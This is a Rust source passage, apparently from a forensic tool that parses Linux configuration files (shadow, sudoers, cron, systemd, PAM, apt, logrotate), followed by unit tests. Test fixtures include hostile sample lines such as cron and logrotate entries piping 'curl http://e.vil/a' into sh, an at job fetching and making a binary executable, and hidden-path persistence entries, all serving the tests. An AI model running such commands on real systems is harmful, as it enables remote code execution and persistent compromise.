        p.items.push(Item::new(t.split_whitespace().next().unwrap_or(""), t, "at_command", n).user(user.clone()));
    }
    crate::diag::info(code::PARSE_AT_JOB, format!("{file_name}: {} command(s)", p.items.len()));
    p
}

fn ini(text: &str, kind: &'static str) -> Parsed {
    let mut p = Parsed::default();
    let mut section: Option<String> = None;
    let mut warned = false;
    for (n, l) in joined(text) {
        if is_comment(&l, &['#', ';']) {
            continue;
        }
        let t = l.trim();
        if t.starts_with('[') && t.ends_with(']') {
            section = Some(t[1..t.len() - 1].trim().to_string());
            continue;
        }
        let Some((k, v)) = t.split_once('=') else {
            p.bad_lines += 1;
            crate::diag::warn(code::PARSE_UNIT_BAD_LINE, format!("line {n}"));
            p.items.push(Item::new(format!("line {n}"), t, "unparsed", n));
            continue;
        };
        let k = k.trim();
        let key = match &section {
            Some(s) => format!("{s}.{k}"),
            None => {
                if !warned {
                    crate::diag::info(code::PARSE_UNIT_NO_SECTION, format!("line {n}"));
                    warned = true;
                }
                k.to_string()
            }
        };
        let v = v.trim();
        let value = if is_secret_key(k) && !v.is_empty() {
            p.redacted += 1;
            crate::diag::info(code::PARSE_SECRET_REDACTED, format!("line {n}: {k}"));
            redacted(v)
        } else {
            v.to_string()
        };
        p.items.push(Item::new(key, value, kind, n));
    }
    p
}

fn pam(text: &str) -> Parsed {
    let mut p = Parsed::default();
    for (n, l) in joined(text) {
        if is_comment(&l, &['#']) {
            continue;
        }
        let t = l.trim();
        if let Some(target) = t.strip_prefix("@include") {
            crate::diag::info(code::PARSE_PAM_INCLUDE, target.trim().to_string());
            p.items.push(Item::new("@include", target.trim(), "include", n));
            continue;
        }
        let (ptype, rest) = match t.find(char::is_whitespace) {
            Some(i) => (&t[..i], t[i..].trim()),
            None => (t, ""),
        };
        // The control is one word or a [bracketed list].
        let (control, rest) = if rest.starts_with('[') {
            match rest.find(']') {
                Some(i) => (&rest[..=i], rest[i + 1..].trim()),
                None => (rest, ""),
            }
        } else {
            match rest.find(char::is_whitespace) {
                Some(i) => (&rest[..i], rest[i..].trim()),
                None => (rest, ""),
            }
        };
        let (module, args) = match rest.find(char::is_whitespace) {
            Some(i) => (&rest[..i], rest[i..].trim()),
            None => (rest, ""),
        };
        if module.is_empty() && !matches!(control, "include" | "substack") {
            p.bad_lines += 1;
            crate::diag::warn(code::PARSE_PAM_BAD_LINE, format!("line {n}"));
            p.items.push(Item::new(ptype, t, "unparsed", n));
            continue;
        }
        if matches!(control, "include" | "substack") {
            crate::diag::info(code::PARSE_PAM_INCLUDE, format!("{control} {module}"));
        }
        p.items.push(Item::new(ptype.trim_start_matches('-'), format!("control={control} module={module} args={args}"), "pam", n));
    }
    p
}

fn apt_sources(text: &str) -> Parsed {
    let mut p = Parsed::default();
    for (n, l) in numbered(text) {
        if is_comment(l, &['#']) {
            continue;
        }
        let t = l.trim();
        let mut toks = t.split_whitespace();
        let kind = toks.next().unwrap_or("");
        if kind != "deb" && kind != "deb-src" {
            p.bad_lines += 1;
            crate::diag::warn(code::PARSE_APT_BAD_LINE, format!("line {n}"));
            p.items.push(Item::new(kind, t, "unparsed", n));
            continue;
        }
        let rest: Vec<&str> = toks.collect();
        let opts_end = if rest.first().is_some_and(|f| f.starts_with('[')) { rest.iter().position(|x| x.ends_with(']')).map(|i| i + 1).unwrap_or(1) } else { 0 };
        let options = rest[..opts_end].join(" ");
        let uri = rest.get(opts_end).copied().unwrap_or("");
        let suite = rest.get(opts_end + 1).copied().unwrap_or("");
        let comps = rest.get(opts_end + 2..).map(|c| c.join(" ")).unwrap_or_default();
        p.items.push(Item::new(uri, format!("type={kind} suite={suite} components={comps} options={}", options.trim_matches(['[', ']'])), "apt_source", n));
    }
    p
}

fn apt_deb822(text: &str) -> Parsed {
    let mut p = Parsed::default();
    crate::diag::info(code::PARSE_APT_DEB822, "deb822 stanzas");
    let mut stanza: BTreeMap<String, String> = BTreeMap::new();
    let mut start = 0usize;
    let flush = |stanza: &mut BTreeMap<String, String>, start: usize, p: &mut Parsed| {
        if stanza.is_empty() {
            return;
        }
        let uris = stanza.remove("URIs").unwrap_or_default();
        let value = stanza.iter().map(|(k, v)| format!("{k}={v}")).collect::<Vec<_>>().join(" ");
        p.items.push(Item::new(uris, value, "apt_source", start));
        stanza.clear();
    };
    for (n, l) in numbered(text) {
        if l.trim().is_empty() {
            flush(&mut stanza, start, &mut p);
            continue;
        }
        if l.trim_start().starts_with('#') || l.starts_with(' ') || l.starts_with('\t') {
            continue;
        }
        if stanza.is_empty() {
            start = n;
        }
        if let Some((k, v)) = l.split_once(':') {
            stanza.insert(k.trim().to_string(), v.trim().to_string());
        }
    }
    flush(&mut stanza, start, &mut p);
    p
}

fn dpkg_status(text: &str, times: &BTreeMap<String, Timestamp>) -> Parsed {
    let mut p = Parsed::default();
    let mut cur: BTreeMap<&str, &str> = BTreeMap::new();
    let mut start = 1usize;
    let mut used_times = false;
    let mut emit = |cur: &mut BTreeMap<&str, &str>, start: usize, p: &mut Parsed| {
        if cur.is_empty() {
            return;
        }
        match cur.get("Package") {
            Some(pkg) => {
                let arch = cur.get("Architecture").copied().unwrap_or("");
                let t = times.get(&format!("{pkg}:{arch}")).or_else(|| times.get(*pkg)).copied();
                if t.is_some() {
                    used_times = true;
                }
                let value = format!("version={} status={} arch={arch} source={}", cur.get("Version").copied().unwrap_or(""), cur.get("Status").copied().unwrap_or(""), cur.get("Source").copied().unwrap_or(""));
                p.items.push(Item::new(*pkg, value, "package", start).at(t, "dpkg_info_list"));
            }
            None => p.bad_lines += 1,
        }
        cur.clear();
    };
    for (n, l) in numbered(text) {
        if l.is_empty() {
            emit(&mut cur, start, &mut p);
            continue;
        }
        if l.starts_with(' ') || l.starts_with('\t') {
            continue;
        }
        if cur.is_empty() {
            start = n;
        }
        if let Some((k, v)) = l.split_once(':') {
            if matches!(k, "Package" | "Status" | "Version" | "Architecture" | "Source") {
                cur.insert(k, v.trim());
            }
        }
    }
    emit(&mut cur, start, &mut p);
    if p.bad_lines > 0 {
        crate::diag::warn(code::PARSE_DPKG_STANZA_BAD, format!("{} stanza(s)", p.bad_lines));
    }
    if used_times {
        crate::diag::info(code::PARSE_DPKG_INSTALL_TIME, format!("{} package(s)", p.items.len()));
    }
    p
}

fn logrotate(text: &str) -> Parsed {
    let mut p = Parsed::default();
    let mut script: Option<String> = None;
    let mut target = String::new();
    for (n, l) in numbered(text) {
        if is_comment(l, &['#']) {
            continue;
        }
        let t = l.trim();
        if let Some(s) = &script {
            if t == "endscript" {
                script = None;
            } else {
                p.items.push(Item::new(format!("{target}|{s}"), t, "logrotate_script", n));
            }
            continue;
        }
        if matches!(t, "prerotate" | "postrotate" | "firstaction" | "lastaction" | "preremove") {
            crate::diag::info(code::PARSE_LOGROTATE_SCRIPT, format!("line {n}: {t}"));
            script = Some(t.to_string());
            continue;
        }
        if let Some(head) = t.strip_suffix('{') {
            target = head.trim().to_string();
            continue;
        }
        if t == "}" {
            target.clear();
            continue;
        }
        let key = if target.is_empty() { t.split_whitespace().next().unwrap_or("").to_string() } else { format!("{target}|{}", t.split_whitespace().next().unwrap_or("")) };
        p.items.push(Item::new(key, t, "directive", n));
    }
    p
}

fn script(text: &str) -> Parsed {
    let mut p = Parsed::default();
    for (i, (n, l)) in joined(text).into_iter().enumerate() {
        let t = l.trim();
        if i == 0 && t.starts_with("#!") {
            crate::diag::record(code::PARSE_SCRIPT_SHEBANG, crate::diag::Severity::Info, t.to_string());
            p.items.push(Item::new("#!", t.trim_start_matches("#!").trim(), "shebang", n));
            continue;
        }
        if is_comment(t, &['#']) {
            continue;
        }
        p.items.push(Item::new(t.split_whitespace().next().unwrap_or(""), t, "command", n));
    }
    p
}

fn lines(text: &str, kind: &'static str, marks: &[char]) -> Parsed {
    let mut p = Parsed::default();
    for (n, l) in numbered(text) {
        if is_comment(l, marks) {
            continue;
        }
        let t = l.trim();
        let mut value = t.to_string();
        // A `password: x` or `psk=x` inside free text (netplan, wpa) is still a secret.
        if let Some((k, v)) = t.split_once([':', '=']) {
            if is_secret_key(k) && !v.trim().is_empty() {
                p.redacted += 1;
                crate::diag::info(code::PARSE_SECRET_REDACTED, format!("line {n}: {}", k.trim()));
                value = format!("{}: {}", k.trim(), redacted(v.trim()));
            }
        }
        p.items.push(Item::new(t.split_whitespace().next().unwrap_or("").trim_end_matches([':', '=']), value, kind, n));
    }
    p
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run(parser: Parser, text: &str) -> Parsed {
        crate::diag::set_quiet(true);
        parse(parser, text.as_bytes(), &Ctx { file_name: "f".into(), size: text.len() as u64, ..Default::default() })
    }

    #[test]
    fn passwd_accounts_flags_and_bad_lines() {
        let p = run(Parser::Passwd, "root:x:0:0:root:/root:/bin/bash\n# comment\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ntoor:x:0:0::/root:/bin/sh\nsvc:x:998:998::/var/lib/svc:/bin/bash\nbroken:x:1\nbob:x:1000:1000:Bob,,,:/home/bob:/bin/zsh\n");
        assert_eq!(p.items.len(), 5);
        assert_eq!(p.bad_lines, 1);
        assert!(crate::diag::has(code::PARSE_PASSWD_BAD_LINE));
        let toor = &p.items[2];
        assert_eq!(toor.key, "toor");
        assert!(toor.value.starts_with("uid=0 gid=0 "), "{}", toor.value);
        assert_eq!(toor.user, "toor");
        assert!(p.items[1].value.contains("interactive=no"));
        assert!(p.items[3].value.contains("system=yes interactive=yes"));
        assert!(p.items[4].value.contains("system=no"));
        assert_eq!(p.items[4].line, 7);
        crate::diag::drain();
    }

    #[test]
    fn passwd_duplicates_and_bad_uid() {
        let p = run(Parser::Passwd, "a:x:1:1::/:/bin/sh\na:x:2:2::/:/bin/sh\nb:x:x:1::/:/bin/sh\n");
        assert_eq!(p.items.len(), 3);
        assert!(crate::diag::has(code::PARSE_PASSWD_DUPLICATE));
        assert!(crate::diag::has(code::PARSE_PASSWD_BAD_UID));
        crate::diag::drain();
    }

    #[test]
    fn interactive_shells() {
        assert!(is_interactive_shell("/bin/bash"));
        assert!(is_interactive_shell("/usr/bin/fish"));
        assert!(!is_interactive_shell("/usr/sbin/nologin"));
        assert!(!is_interactive_shell("/bin/false"));
        assert!(!is_interactive_shell("/bin/sync"));
        assert!(!is_interactive_shell(""));
    }

    #[test]
    fn group_privileged() {
        let p = run(Parser::Group, "sudo:x:27:bob,eve\nusers:x:100:\nbad:x\n");
        assert_eq!(p.items.len(), 2);
        assert!(p.items[0].value.contains("members=bob,eve privileged=yes"));
        assert!(p.items[1].value.contains("privileged=no"));
        assert!(crate::diag::has(code::PARSE_GROUP_BAD_LINE));
        crate::diag::drain();
    }

    #[test]
    fn shadow_never_copies_hashes() {
        let hash = "$6$saltsalt$abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        let text = format!("root:{hash}:19000:0:99999:7:::\nbob::19500:0:99999:7:::\nsys:*:18000:0:99999:7:::\neve:!$y$j9T$x$y:19600:0:99999:7::20000:\nshort:x\n");
        let p = run(Parser::Shadow, &text);
        assert_eq!(p.items.len(), 4);
        for it in &p.items {
            assert!(!it.value.contains("saltsalt") && !it.value.contains("abcdef") && !it.value.contains("j9T"), "hash leaked: {}", it.value);
        }
        assert!(p.items[0].value.starts_with("password=set scheme=sha512crypt last_change=2022-01-08"), "{}", p.items[0].value);
        assert!(p.items[1].value.starts_with("password=empty scheme=none"));
        assert!(p.items[2].value.starts_with("password=disabled"));
        assert!(p.items[3].value.starts_with("password=locked scheme=yescrypt"));
        assert!(p.items[3].value.ends_with("expire=2024-10-04"), "{}", p.items[3].value);
        let (t, src) = p.items[0].time.unwrap();
        assert_eq!(src, "shadow_last_change");
        assert_eq!(t.secs, 19000 * 86400);
        assert!(crate::diag::has(code::PARSE_SHADOW_HASH_WITHHELD));
        assert!(crate::diag::has(code::PARSE_SHADOW_BAD_LINE));
        crate::diag::drain();
    }

    #[test]
    fn shadow_bad_date_and_gshadow() {
        let p = run(Parser::Shadow, "a:x:soon:0:99999:7:::\n");
        assert!(p.items[0].time.is_none());
        assert!(crate::diag::has(code::PARSE_SHADOW_BAD_DATE));
        let g = run(Parser::Gshadow, "sudo:!:alice:bob,eve\n");
        assert_eq!(g.items[0].value, "password=disabled scheme=none admins=alice members=bob,eve");
        crate::diag::drain();
    }

    #[test]
    fn password_states() {
        assert_eq!(password_state(""), ("empty", "none"));
        assert_eq!(password_state("!"), ("disabled", "none"));
        assert_eq!(password_state("*"), ("disabled", "none"));
        assert_eq!(password_state("$1$abc$def"), ("set", "md5crypt"));
        assert_eq!(password_state("$5$a$b"), ("set", "sha256crypt"));
        assert_eq!(password_state("$2b$10$x"), ("set", "bcrypt"));
        assert_eq!(password_state("!$6$a$b"), ("locked", "sha512crypt"));
        assert_eq!(password_state("abcdefghijklm"), ("set", "des"));
        assert_eq!(password_state("$gy$x"), ("set", "gost-yescrypt"));
        assert_eq!(password_state("$9$x"), ("set", "other"));
        assert_eq!(password_state("weird"), ("set", "unknown"));
    }

    #[test]
    fn sudoers_rules_defaults_aliases_includes() {
        let p = run(Parser::Sudoers, "Defaults env_reset\nDefaults:bob !requiretty\n# a comment\nUser_Alias ADMINS = bob, eve\nroot ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\nbob ALL=(ALL) NOPASSWD: ALL\n#includedir /etc/sudoers.d\n@include /etc/sudoers.local\neve ALL=(ALL) \\\n  /usr/bin/less\nnonsense\n");
        let kinds: Vec<&str> = p.items.iter().map(|i| i.kind).collect();
        assert_eq!(kinds, vec!["sudo_default", "sudo_default", "sudo_alias", "sudo_rule", "sudo_rule", "sudo_rule", "include", "include", "sudo_rule", "unparsed"]);
        assert_eq!(p.items[2].key, "User_Alias ADMINS");
        assert_eq!(p.items[5].value, "ALL=(ALL) NOPASSWD: ALL");
        assert_eq!(p.items[4].user, "sudo");
        assert_eq!(p.items[6].key, "includedir");
        assert_eq!(p.items[6].value, "/etc/sudoers.d");
        assert_eq!(p.items[8].value, "ALL=(ALL) /usr/bin/less");
        assert_eq!(p.items[8].line, 10);
        assert!(crate::diag::has(code::PARSE_SUDO_CONTINUATION));
        assert!(crate::diag::has(code::PARSE_SUDO_INCLUDE));
        assert!(crate::diag::has(code::PARSE_SUDO_BAD_LINE));
        crate::diag::drain();
    }

    #[test]
    fn ssh_config_global_match_and_equals() {
        let p = run(Parser::SshConfig, "PermitRootLogin yes\nPasswordAuthentication=no\nInclude /etc/ssh/sshd_config.d/*.conf\nX11Forwarding\nMatch User bob\n  ForceCommand /bin/false\n");
        assert_eq!(p.items[0].key, "PermitRootLogin");
        assert_eq!(p.items[0].value, "yes");
        assert_eq!(p.items[1].value, "no");
        assert_eq!(p.items[2].kind, "include");
        assert_eq!(p.items[3].value, "");
        assert_eq!(p.items[4].kind, "block");
        assert_eq!(p.items[5].key, "Match User bob|ForceCommand");
        assert!(crate::diag::has(code::PARSE_SSH_MATCH_BLOCK));
        assert!(crate::diag::has(code::PARSE_SSH_BAD_LINE));
        crate::diag::drain();
    }

    #[test]
    fn authorized_keys_with_options_and_comments() {
        let p = run(Parser::AuthorizedKeys, "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIlongkeymaterial bob@laptop\ncommand=\"/usr/bin/backup\",no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ backup\nnot a key\nssh-rsa AAAAB3Nza\n");
        assert_eq!(p.items.len(), 4);
        assert_eq!(p.items[0].key, "bob@laptop");
        assert!(p.items[0].value.starts_with("type=ssh-ed25519 key=AAAAC3NzaC1lZDI1NTE5AAAA"));
        assert!(!p.items[0].value.contains("longkeymaterial"));
        assert!(p.items[1].value.contains("options=command=\"/usr/bin/backup\",no-pty"));
        assert_eq!(p.items[2].kind, "unparsed");
        assert_eq!(p.items[3].key, "key 4");
        assert!(crate::diag::has(code::PARSE_KEY_BAD_LINE));
        crate::diag::drain();
    }

    #[test]
    fn known_hosts_plain_hashed_and_markers() {
        let p = run(Parser::KnownHosts, "github.com,140.82.121.4 ssh-ed25519 AAAAC3Nza\n|1|abc=|def= ecdsa-sha2-nistp256 AAAAE2V\n@cert-authority *.corp ssh-rsa AAAAB3\n");
        assert_eq!(p.items[0].key, "github.com,140.82.121.4");
        assert_eq!(p.items[1].key, "hashed");
        assert!(p.items[2].value.contains("marker=@cert-authority"));
        assert_eq!(p.items[2].key, "*.corp");
        assert!(crate::diag::has(code::PARSE_KEY_HASHED_HOST));
        assert!(is_key_type("sk-ssh-ed25519@openssh.com"));
        assert!(!is_key_type("rsa"));
        crate::diag::drain();
    }

    #[test]
    fn hosts_entries() {
        let p = run(Parser::Hosts, "127.0.0.1 localhost # loop\n10.0.0.5 update.vendor.com\n::1\n\n# only comment\n");
        assert_eq!(p.items.len(), 3);
        assert_eq!(p.items[1].key, "10.0.0.5");
        assert_eq!(p.items[1].value, "update.vendor.com");
        assert_eq!(p.items[2].value, "");
        assert!(crate::diag::has(code::PARSE_HOSTS_BAD_LINE));
        crate::diag::drain();
    }

    #[test]
    fn key_value_styles_and_redaction() {
        let p = run(Parser::KvEq, "export PATH=\"/usr/bin:/bin\"\nLD_PRELOAD=/tmp/x.so\nDB_PASSWORD='hunter2'\nnoequals\n");
        assert_eq!(p.items[0].key, "PATH");
        assert_eq!(p.items[0].value, "/usr/bin:/bin");
        assert_eq!(p.items[1].value, "/tmp/x.so");
        assert_eq!(p.items[2].value, "<redacted 7 chars>");
        assert_eq!(p.redacted, 1);
        assert_eq!(p.items[3].value, "");
        assert!(crate::diag::has(code::PARSE_SECRET_REDACTED));
        assert!(crate::diag::has(code::PARSE_KV_BAD_LINE));
        let s = run(Parser::KvSpace, "nameserver 8.8.8.8\nsearch corp.local\n");
        assert_eq!(s.items[0].key, "nameserver");
        assert_eq!(s.items[0].value, "8.8.8.8");
        let c = run(Parser::KvColon, "passwd: files systemd\nhosts:   files dns\n");
        assert_eq!(c.items[1].value, "files dns");
        crate::diag::drain();
    }

    #[test]
    fn secret_keys() {
        assert!(is_secret_key("psk"));
        assert!(is_secret_key("DB_PASSWORD"));
        assert!(is_secret_key("api_key"));
        assert!(is_secret_key("GITHUB_TOKEN"));
        assert!(!is_secret_key("psk-flags"));
        assert!(!is_secret_key("PasswordAuthentication"));
        assert!(!is_secret_key("PATH"));
        assert_eq!(redacted("abc"), "<redacted 3 chars>");
    }

    #[test]
    fn fstab_crypttab_exports() {
        let p = run(Parser::Fstab, "UUID=abc / ext4 defaults 0 1\n//srv/share /mnt/s cifs username=bob,password=x 0 0\nshort\n");
        assert_eq!(p.items[0].key, "/");
        assert!(p.items[0].value.starts_with("device=UUID=abc type=ext4 options=defaults"));
        assert!(p.items[1].value.contains("options=<redacted"), "{}", p.items[1].value);
        assert_eq!(p.bad_lines, 1);
        let c = run(Parser::Crypttab, "cryptroot UUID=x none luks\n");
        assert_eq!(c.items[0].value, "device=UUID=x keyfile=none options=luks");
        let e = run(Parser::Exports, "/srv/nfs 10.0.0.0/24(rw,no_root_squash)\n/lonely\n");
        assert_eq!(e.items[0].value, "10.0.0.0/24(rw,no_root_squash)");
        assert!(crate::diag::has(code::PARSE_FSTAB_BAD_LINE));
        crate::diag::drain();
    }

    #[test]
    fn crontab_system_and_user() {
        let p = run(Parser::CronSystem, "SHELL=/bin/sh\nPATH=/usr/bin\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n@reboot root /tmp/.x/run.sh\n*/5 * * * * www-data curl -s http://e.vil/a | sh\nnot a cron line\n");
        let kinds: Vec<&str> = p.items.iter().map(|i| i.kind).collect();
        assert_eq!(kinds, vec!["cron_env", "cron_env", "cron_job", "cron_job", "cron_job", "unparsed"]);
        assert_eq!(p.items[2].key, "17 * * * *");
        assert_eq!(p.items[2].value, "user=root command=cd / && run-parts --report /etc/cron.hourly");
        assert_eq!(p.items[3].key, "@reboot");
        assert_eq!(p.items[4].user, "www-data");
        assert!(crate::diag::has(code::PARSE_CRON_ENV));
        assert!(crate::diag::has(code::PARSE_CRON_BAD_LINE));
        crate::diag::drain();
        let u = parse(Parser::CronUser, b"0 3 * * * /home/bob/backup.sh\n", &Ctx { file_name: "bob".into(), ..Default::default() });
        assert_eq!(u.items[0].value, "user=bob command=/home/bob/backup.sh");
        assert_eq!(u.items[0].user, "bob");
        crate::diag::drain();
    }

    #[test]
    fn at_job_body_only() {
        let text = "#!/bin/sh\n# atrun uid=1000 gid=1000\n# mail bob 0\numask 22\nPATH=/usr/bin; export PATH\ncd /home/bob || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n${SHELL:-/bin/sh} << 'marcinDELIMITER5f3a'\nwget http://x/y -O /tmp/y\nchmod +x /tmp/y\nmarcinDELIMITER5f3a\n";
        let p = run(Parser::AtJob, text);
        assert_eq!(p.items.len(), 2, "{:?}", p.items);
        assert_eq!(p.items[0].value, "wget http://x/y -O /tmp/y");
        assert_eq!(p.items[0].user, "1000");
        assert!(crate::diag::has(code::PARSE_AT_JOB));
        crate::diag::drain();
    }

    #[test]
    fn systemd_units_and_ini() {
        let p = run(Parser::Unit, "[Unit]\nDescription=Updater\n\n[Service]\nExecStart=/tmp/.u/upd \\\n  --daemon\nRestart=always\nbad line\n[Install]\nWantedBy=multi-user.target\n");
        assert_eq!(p.items[0].key, "Unit.Description");
        assert_eq!(p.items[1].key, "Service.ExecStart");
        assert_eq!(p.items[1].value, "/tmp/.u/upd --daemon");
        assert_eq!(p.items[3].kind, "unparsed");
        assert_eq!(p.items[4].key, "Install.WantedBy");
        assert!(crate::diag::has(code::PARSE_UNIT_BAD_LINE));
        let i = run(Parser::Ini, "orphan=1\n[wifi-security]\npsk=supersecret\nkey-mgmt=wpa-psk\n");
        assert_eq!(i.items[0].key, "orphan");
        assert_eq!(i.items[1].value, "<redacted 11 chars>");
        assert_eq!(i.items[2].value, "wpa-psk");
        assert!(crate::diag::has(code::PARSE_UNIT_NO_SECTION));
        crate::diag::drain();
    }

    #[test]
    fn pam_lines() {
        let p = run(Parser::Pam, "auth [success=1 default=ignore] pam_unix.so nullok\nauth requisite pam_deny.so\nauth sufficient pam_permit.so\n@include common-account\nsession optional pam_exec.so /tmp/log.sh\n-session optional pam_systemd.so\naccount include system-auth\nbroken\n");
        assert_eq!(p.items[0].value, "control=[success=1 default=ignore] module=pam_unix.so args=nullok");
        assert_eq!(p.items[2].value, "control=sufficient module=pam_permit.so args=");
        assert_eq!(p.items[3].kind, "include");
        assert_eq!(p.items[4].value, "control=optional module=pam_exec.so args=/tmp/log.sh");
        assert_eq!(p.items[5].key, "session");
        assert_eq!(p.items[6].value, "control=include module=system-auth args=");
        assert_eq!(p.items[7].kind, "unparsed");
        assert!(crate::diag::has(code::PARSE_PAM_INCLUDE));
        assert!(crate::diag::has(code::PARSE_PAM_BAD_LINE));
        crate::diag::drain();
    }

    #[test]
    fn apt_sources_both_formats() {
        let p = run(Parser::AptSources, "deb http://archive.ubuntu.com/ubuntu jammy main restricted\ndeb [trusted=yes arch=amd64] http://10.0.0.9/repo ./\nfoo bar\n");
        assert_eq!(p.items[0].key, "http://archive.ubuntu.com/ubuntu");
        assert_eq!(p.items[0].value, "type=deb suite=jammy components=main restricted options=");
        assert_eq!(p.items[1].key, "http://10.0.0.9/repo");
        assert!(p.items[1].value.contains("options=trusted=yes arch=amd64"), "{}", p.items[1].value);
        assert!(crate::diag::has(code::PARSE_APT_BAD_LINE));
        let d = run(Parser::AptDeb822, "Types: deb\nURIs: http://archive.ubuntu.com/ubuntu\nSuites: noble\nComponents: main\n\nTypes: deb\nURIs: http://x/\nTrusted: yes\n");
        assert_eq!(d.items.len(), 2);
        assert_eq!(d.items[1].key, "http://x/");
        assert!(d.items[1].value.contains("Trusted=yes"));
        assert!(crate::diag::has(code::PARSE_APT_DEB822));
        crate::diag::drain();
    }

    #[test]
    fn dpkg_status_with_install_times() {
        let mut times = BTreeMap::new();
        times.insert("bash:amd64".to_string(), Timestamp::from_unix(1_700_000_000, 0));
        let text = "Package: bash\nStatus: install ok installed\nArchitecture: amd64\nVersion: 5.1\nDescription: GNU shell\n more text\n\nPackage: nmap\nStatus: install ok installed\nVersion: 7.9\n\nStatus: broken\n";
        let p = parse(Parser::DpkgStatus, text.as_bytes(), &Ctx { file_name: "status".into(), dpkg_times: times, ..Default::default() });
        assert_eq!(p.items.len(), 2);
        assert_eq!(p.items[0].key, "bash");
        assert_eq!(p.items[0].value, "version=5.1 status=install ok installed arch=amd64 source=");
        assert_eq!(p.items[0].time.unwrap().1, "dpkg_info_list");
        assert!(p.items[1].time.is_none());
        assert_eq!(p.bad_lines, 1);
        assert!(crate::diag::has(code::PARSE_DPKG_INSTALL_TIME));
        assert!(crate::diag::has(code::PARSE_DPKG_STANZA_BAD));
        crate::diag::drain();
    }

    #[test]
    fn logrotate_scripts() {
        let p = run(Parser::Logrotate, "/var/log/app/*.log {\n  daily\n  postrotate\n    curl http://x | sh\n  endscript\n}\nweekly\n");
        assert_eq!(p.items[0].key, "/var/log/app/*.log|daily");
        assert_eq!(p.items[1].kind, "logrotate_script");
        assert_eq!(p.items[1].key, "/var/log/app/*.log|postrotate");
        assert_eq!(p.items[1].value, "curl http://x | sh");
        assert_eq!(p.items[2].key, "weekly");
        assert!(crate::diag::has(code::PARSE_LOGROTATE_SCRIPT));
        crate::diag::drain();
    }

    #[test]
    fn scripts_lines_and_shebang() {
        let p = run(Parser::Script, "#!/bin/bash\n# comment\nexport A=1\nnohup /dev/shm/.k &\nexit 0\n");
        assert_eq!(p.items[0].kind, "shebang");
        assert_eq!(p.items[0].value, "/bin/bash");
        assert_eq!(p.items[1].key, "export");
        assert_eq!(p.items[2].value, "nohup /dev/shm/.k &");
        assert_eq!(p.items.len(), 4);
        let l = run(Parser::Lines, "# x\n; y\n/usr/lib/evil.so\n  password: hunter2\n");
        assert_eq!(l.items.len(), 2);
        assert_eq!(l.items[0].value, "/usr/lib/evil.so");
        assert_eq!(l.items[1].value, "password: <redacted 7 chars>");
        crate::diag::drain();
    }

    #[test]
    fn binary_links_files_empty_and_limits() {
        crate::diag::set_quiet(true);
        let b = parse(Parser::Lines, b"\x7fELF\0\0\0", &Ctx { file_name: "gen".into(), size: 7, ..Default::default() });
        assert_eq!(b.items[0].kind, "file");
        assert!(crate::diag::has(code::PARSE_BINARY));
        let l = parse(Parser::Script, b"", &Ctx { file_name: "S01x".into(), link_target: Some("../init.d/x".into()), ..Default::default() });
        assert_eq!(l.items[0].value, "link=../init.d/x");
        assert!(crate::diag::has(code::PARSE_LINK));
        let f = parse(Parser::FileOnly, b"whatever", &Ctx { file_name: "lock".into(), size: 8, ..Default::default() });
        assert_eq!(f.items[0].value, "size=8");
        assert!(crate::diag::has(code::PARSE_FILE_ONLY));
        let r = parse(Parser::RpmDb, b"", &Ctx { file_name: "rpmdb.sqlite".into(), ..Default::default() });
        assert_eq!(r.items[0].kind, "file");
        assert!(crate::diag::has(code::PARSE_RPM_UNSUPPORTED));
        let e = parse(Parser::Lines, b"# only\n\n", &Ctx { file_name: "e".into(), ..Default::default() });
        assert!(e.items.is_empty());
        assert!(crate::diag::has(code::PARSE_EMPTY));
        let m = parse(Parser::Lines, b"a\nb\nc\n", &Ctx { file_name: "m".into(), max_items: 2, ..Default::default() });
        assert_eq!(m.items.len(), 2);
        assert!(m.truncated);
        assert!(crate::diag::has(code::PARSE_TOO_MANY_ITEMS));
        let u = parse(Parser::Lines, b"caf\xe9\n", &Ctx { file_name: "u".into(), ..Default::default() });
        assert_eq!(u.items[0].value, "caf\u{fffd}");
        assert!(crate::diag::has(code::PARSE_NOT_UTF8));
        let long = "x".repeat(5000);
        let lg = parse(Parser::Lines, long.as_bytes(), &Ctx { file_name: "lg".into(), ..Default::default() });
        assert_eq!(lg.items[0].value.len(), 4096);
        assert!(crate::diag::has(code::PARSE_SCRIPT_LONG_LINE));
        crate::diag::drain();
    }

    #[test]
    fn crlf_and_parser_names() {
        let p = run(Parser::KvEq, "A=1\r\nB=2\r\n");
        assert_eq!(p.items[1].value, "2");
        let all = [Parser::Passwd, Parser::Group, Parser::Shadow, Parser::Gshadow, Parser::Sudoers, Parser::SshConfig, Parser::AuthorizedKeys, Parser::KnownHosts, Parser::Hosts, Parser::KvSpace, Parser::KvColon, Parser::KvEq, Parser::Fstab, Parser::Crypttab, Parser::Exports, Parser::CronSystem, Parser::CronUser, Parser::AtJob, Parser::Unit, Parser::Ini, Parser::Pam, Parser::AptSources, Parser::AptDeb822, Parser::AptConf, Parser::DpkgStatus, Parser::RpmDb, Parser::Logrotate, Parser::Script, Parser::Lines, Parser::FileOnly];
        let names: std::collections::HashSet<&str> = all.iter().map(|p| p.name()).collect();
        assert_eq!(names.len(), all.len());
        crate::diag::drain();
    }
}
